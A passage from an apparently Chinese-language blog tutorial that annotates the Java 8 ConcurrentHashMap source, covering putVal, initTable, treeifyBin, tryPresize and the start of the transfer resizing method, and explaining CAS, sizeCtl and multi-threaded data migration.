class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(K key, V value, <span class="keyword">boolean</span> onlyIfAbsent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span> || value == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// 得到 hash 值</span></span><br><span class="line">    <span class="keyword">int</span> hash = spread(key.hashCode());</span><br><span class="line">    <span class="comment">// 用于记录相应链表的长度</span></span><br><span class="line">    <span class="keyword">int</span> binCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="keyword">int</span> n, i, fh;</span><br><span class="line">        <span class="comment">// 如果数组"空"，进行数组初始化</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 初始化数组，后面会详细介绍</span></span><br><span class="line">            tab = initTable();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找该 hash 值对应的数组下标，得到第一个节点 f</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果数组该位置为空，</span></span><br><span class="line">            <span class="comment">//    用一次 CAS 操作将这个新值放入其中即可，这个 put 操作差不多就结束了，可以拉到最后面了</span></span><br><span class="line">            <span class="comment">//  如果 CAS 失败，那就是有并发操作，进到下一个循环就好了</span></span><br><span class="line">            <span class="keyword">if</span> (casTabAt(tab, i, <span class="keyword">null</span>,</span><br><span class="line">                         <span class="keyword">new</span> Node&lt;K,V&gt;(hash, key, value, <span class="keyword">null</span>)))</span><br><span class="line">                <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// hash 居然可以等于 MOVED，这个需要到后面才能看明白，不过从名字上也能猜到，肯定是因为在扩容</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            <span class="comment">// 帮助数据迁移，这个等到看完数据迁移部分的介绍后，再理解这个就很简单了</span></span><br><span class="line">            tab = helpTransfer(tab, f);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 到这里就是说，f 是该位置的头结点，而且不为空</span></span><br><span class="line">            </span><br><span class="line">            V oldVal = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// 获取数组该位置的头结点的监视器锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123; <span class="comment">// 头结点的 hash 值大于 0，说明是链表</span></span><br><span class="line">                        <span class="comment">// 用于累加，记录链表的长度</span></span><br><span class="line">                        binCount = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">// 遍历链表</span></span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">                            K ek;</span><br><span class="line">                            <span class="comment">// 如果发现了"相等"的 key，判断是否要进行值覆盖，然后也就可以 break 了</span></span><br><span class="line">                            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                                ((ek = e.key) == key ||</span><br><span class="line">                                 (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">                                oldVal = e.val;</span><br><span class="line">                                <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                    e.val = value;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 到了链表的最末端，将这个新值放到链表的最后面</span></span><br><span class="line">                            Node&lt;K,V&gt; pred = e;</span><br><span class="line">                            <span class="keyword">if</span> ((e = e.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                pred.next = <span class="keyword">new</span> Node&lt;K,V&gt;(hash, key,</span><br><span class="line">                                                          value, <span class="keyword">null</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123; <span class="comment">// 红黑树</span></span><br><span class="line">                        Node&lt;K,V&gt; p;</span><br><span class="line">                        binCount = <span class="number">2</span>;</span><br><span class="line">                        <span class="comment">// 调用红黑树的插值方法插入新节点</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                                                       value)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            oldVal = p.val;</span><br><span class="line">                            <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                p.val = value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 判断是否要将链表转换为红黑树，临界值和 HashMap 一样，也是 8</span></span><br><span class="line">                <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">                    <span class="comment">// 这个方法和 HashMap 中稍微有一点点不同，那就是它不是一定会进行红黑树转换，</span></span><br><span class="line">                    <span class="comment">// 如果当前数组的长度小于 64，那么会选择进行数组扩容，而不是转换为红黑树</span></span><br><span class="line">                    <span class="comment">//    具体源码我们就不看了，扩容部分后面说</span></span><br><span class="line">                    treeifyBin(tab, i);</span><br><span class="line">                <span class="keyword">if</span> (oldVal != <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> oldVal;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    addCount(<span class="number">1L</span>, binCount);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>put 的主流程看完了，但是至少留下了几个问题，第一个是初始化，第二个是扩容，第三个是帮助数据迁移，这些我们都会在后面进行一一介绍。</p><h4><span id="初始化数组inittable">初始化数组：initTable</span></h4><p>这个比较简单，主要就是初始化一个<strong>合适大小</strong>的数组，然后会设置 sizeCtl。</p><p>初始化方法中的并发问题是通过对 sizeCtl 进行一个 CAS 操作来控制的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; <span class="keyword">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((tab = table) == <span class="keyword">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化的"功劳"被其他线程"抢去"了</span></span><br><span class="line">        <span class="keyword">if</span> ((sc = sizeCtl) &lt; <span class="number">0</span>)</span><br><span class="line">            Thread.yield(); <span class="comment">// lost initialization race; just spin</span></span><br><span class="line">        <span class="comment">// CAS 一下，将 sizeCtl 设置为 -1，代表抢到了锁</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// DEFAULT_CAPACITY 默认初始容量是 16</span></span><br><span class="line">                    <span class="keyword">int</span> n = (sc &gt; <span class="number">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class="line"><span class="comment">// 初始化数组，长度为 16 或初始化时提供的长度</span></span><br><span class="line">                    Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node&lt;?,?&gt;[n];</span><br><span class="line">                    <span class="comment">// 将这个数组赋值给 table，table 是 volatile 的</span></span><br><span class="line">                    table = tab = nt;</span><br><span class="line">                    <span class="comment">// 如果 n 为 16 的话，那么这里 sc = 12</span></span><br><span class="line">                    <span class="comment">// 其实就是 0.75 * n</span></span><br><span class="line">                    sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 设置 sizeCtl 为 sc，我们就当是 12 吧</span></span><br><span class="line">                sizeCtl = sc;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="链表转红黑树-treeifybin">链表转红黑树: treeifyBin</span></h4><p>前面我们在 put 源码分析也说过，treeifyBin 不一定就会进行红黑树转换，也可能是仅仅做数组扩容。我们还是进行源码分析吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; b; <span class="keyword">int</span> n, sc;</span><br><span class="line">    <span class="keyword">if</span> (tab != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// MIN_TREEIFY_CAPACITY 为 64</span></span><br><span class="line">        <span class="comment">// 所以，如果数组长度小于 64 的时候，其实也就是 32 或者 16 或者更小的时候，会进行数组扩容</span></span><br><span class="line">        <span class="keyword">if</span> ((n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            <span class="comment">// 后面我们再详细分析这个方法</span></span><br><span class="line">            tryPresize(n &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// b 是头结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((b = tabAt(tab, index)) != <span class="keyword">null</span> &amp;&amp; b.hash &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (b) &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, index) == b) &#123;</span><br><span class="line">                    <span class="comment">// 下面就是遍历链表，建立一颗红黑树</span></span><br><span class="line">                    TreeNode&lt;K,V&gt; hd = <span class="keyword">null</span>, tl = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">for</span> (Node&lt;K,V&gt; e = b; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">                        TreeNode&lt;K,V&gt; p =</span><br><span class="line">                            <span class="keyword">new</span> TreeNode&lt;K,V&gt;(e.hash, e.key, e.val,</span><br><span class="line">                                              <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> ((p.prev = tl) == <span class="keyword">null</span>)</span><br><span class="line">                            hd = p;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            tl.next = p;</span><br><span class="line">                        tl = p;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 将红黑树设置到数组相应位置中</span></span><br><span class="line">                    setTabAt(tab, index, <span class="keyword">new</span> TreeBin&lt;K,V&gt;(hd));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="扩容trypresize">扩容：tryPresize</span></h3><p>如果说 Java8 ConcurrentHashMap 的源码不简单，那么说的就是扩容操作和迁移操作。</p><p>这个方法要完完全全看懂还需要看之后的 transfer 方法，读者应该提前知道这点。</p><p>这里的扩容也是做翻倍扩容的，扩容后数组容量为原来的 2 倍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先要说明的是，方法参数 size 传进来的时候就已经翻了倍了</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">tryPresize</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// c：size 的 1.5 倍，再加 1，再往上取最近的 2 的 n 次方。</span></span><br><span class="line">    <span class="keyword">int</span> c = (size &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ? MAXIMUM_CAPACITY :</span><br><span class="line">        tableSizeFor(size + (size &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((sc = sizeCtl) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab = table; <span class="keyword">int</span> n;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这个 if 分支和之前说的初始化数组的代码基本上是一样的，在这里，我们可以不用管这块代码</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>) &#123;</span><br><span class="line">            n = (sc &gt; c) ? sc : c;</span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table == tab) &#123;</span><br><span class="line">                        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                        Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node&lt;?,?&gt;[n];</span><br><span class="line">                        table = nt;</span><br><span class="line">                        sc = n - (n &gt;&gt;&gt; <span class="number">2</span>); <span class="comment">// 0.75 * n</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    sizeCtl = sc;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &lt;= sc || n &gt;= MAXIMUM_CAPACITY)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tab == table) &#123;</span><br><span class="line">            <span class="comment">// 我没看懂 rs 的真正含义是什么，不过也关系不大</span></span><br><span class="line">            <span class="keyword">int</span> rs = resizeStamp(n);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                Node&lt;K,V&gt;[] nt;</span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="keyword">null</span> ||</span><br><span class="line">                    transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 2. 用 CAS 将 sizeCtl 加 1，然后执行 transfer 方法</span></span><br><span class="line">                <span class="comment">//    此时 nextTab 不为 null</span></span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                    transfer(tab, nt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 1. 将 sizeCtl 设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2)</span></span><br><span class="line">            <span class="comment">//     我是没看懂这个值真正的意义是什么？不过可以计算出来的是，结果是一个比较大的负数</span></span><br><span class="line">            <span class="comment">//  调用 transfer 方法，此时 nextTab 参数为 null</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc,</span><br><span class="line">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                transfer(tab, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的核心在于 sizeCtl 值的操作，首先将其设置为一个负数，然后执行 transfer(tab, null)，再下一个循环将 sizeCtl 加 1，并执行 transfer(tab, nt)，之后可能是继续 sizeCtl 加 1，并执行 transfer(tab, nt)。</p><p>所以，可能的操作就是执行 <strong>1 次 transfer(tab, null) + 多次 transfer(tab, nt)</strong>，这里怎么结束循环的需要看完 transfer 源码才清楚。</p><h4><span id="数据迁移transfer">数据迁移：transfer</span></h4><p>下面这个方法有点长，将原来的 tab 数组的元素迁移到新的 nextTab 数组中。</p><p>虽然我们之前说的 tryPresize 方法中多次调用 transfer 不涉及多线程，但是这个 transfer 方法可以在其他地方被调用，典型地，我们之前在说 put 方法的时候就说过了，请往上看 put 方法，是不是有个地方调用了 helpTransfer 方法，helpTransfer 方法会调用 transfer 方法的。</p><p>此方法支持多线程执行，外围调用此方法的时候，会保证第一个发起数据迁移的线程，nextTab 参数为 null，之后再调用此方法的时候，nextTab 不会为 null。</p><p>阅读源码之前，先要理解并发操作的机制。原数组长度为 n，所以我们有 n 个迁移任务，让每个线程每次负责一个小任务是最简单的，每做完一个任务再检测是否有其他没做完的任务，帮助迁移就可以了，而 Doug Lea 使用了一个 stride，简单理解就是<strong>步长</strong>，每个线程每次负责迁移其中的一部分，如每次迁移 16 个小任务。所以，我们就需要一个全局的调度者来安排哪个线程执行哪几个任务，这个就是属性 transferIndex 的作用。</p><p>第一个发起数据迁移的线程会将 transferIndex 指向原数组最后的位置，然后<strong>从后往前</strong>的 stride 个任务属于第一个线程，然后将 transferIndex 指向新的位置，再往前的 stride 个任务属于第二个线程，依此类推。当然，这里说的第二个线程不是真的一定指代了第二个线程，也可以是同一个线程，这个读者应该能理解吧。其实就是将一个大的迁移任务分为了一个个任务包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">transfer</span><span class="params">(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = tab.length, stride;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stride 在单核下直接等于 n，多核模式下为 (n&gt;&gt;&gt;3)/NCPU，最小值是 16</span></span><br><span class="line">    <span class="comment">// stride 可以理解为”步长“，有 n 个位置是需要进行迁移的，</span></span><br><span class="line">    <span class="comment">//   将这 n 个任务分为多个任务包，每个任务包有 stride 个任务</span></span><br><span class="line">    <span class="keyword">if</span> ((stride = (NCPU &gt; <span class="number">1</span>) ? (n &gt;&gt;&gt; <span class="number">3</span>) / NCPU : n) &lt; MIN_TRANSFER_STRIDE)</span><br><span class="line">        stride = MIN_TRANSFER_STRIDE; <span class="comment">// subdivide range</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 nextTab 为 null，先进行一次初始化</span></span><br><span class="line">    <span class="comment">//    前面我们说了，外围会保证第一个发起迁移的线程调用此方法时，参数 nextTab 为 null</span></span><br><span class="line">    <span class="comment">//   之后参与迁移的线程调用此方法时，nextTab 不会为 null</span></span><br><span class="line">    <span class="keyword">if</span> (nextTab == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 容量翻倍</span></span><br><span class="line">            Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node&lt;?,?&gt;[n &lt;&lt; <span class="number">1</span>];</span><br><span class="line">            nextTab = nt;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;      <span class="comment">// try to cope with OOME</span></span><br><span class="line">            sizeCtl = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// nextTable 是 ConcurrentHashMap 中的属性</span></span><br><span class="line">        nextTable = nextTab;</span><br><span class="line">        <span class="comment">// transferIndex 也是 ConcurrentHashMap 的属性，用于控制迁移的位置</span></span><br><span class="line">        transferIndex = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> nextn = nextTab.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ForwardingNode 翻译过来就是正在被迁移的 Node</span></span><br><span class="line">    <span class="comment">// 这个构造方法会生成一个Node，key、value 和 next 都为 null，关键是 hash 为 MOVED</span></span><br><span class="line">    <span class="comment">// 后面我们会看到，原数组中位置 i 处的节点完成迁移工作后，</span></span><br><span class="line">    <span class="comment">//    就会将位置 i 处设置为这个 ForwardingNode，用来告诉其他线程该位置已经处理过了</span></span><br><span class="line">    <span class="comment">//    所以它其实相当于是一个标志。</span></span><br><span class="line">    ForwardingNode&lt;K,V&gt; fwd = <span class="keyword">new</span> ForwardingNode&lt;K,V&gt;(nextTab);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// advance 指的是做完了一个位置的迁移工作，可以准备做下一个位置的了</span></span><br><span class="line">    <span class="keyword">boolean</span> advance = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> finishing = <span class="keyword">false</span>; <span class="comment">// to ensure sweep before committing 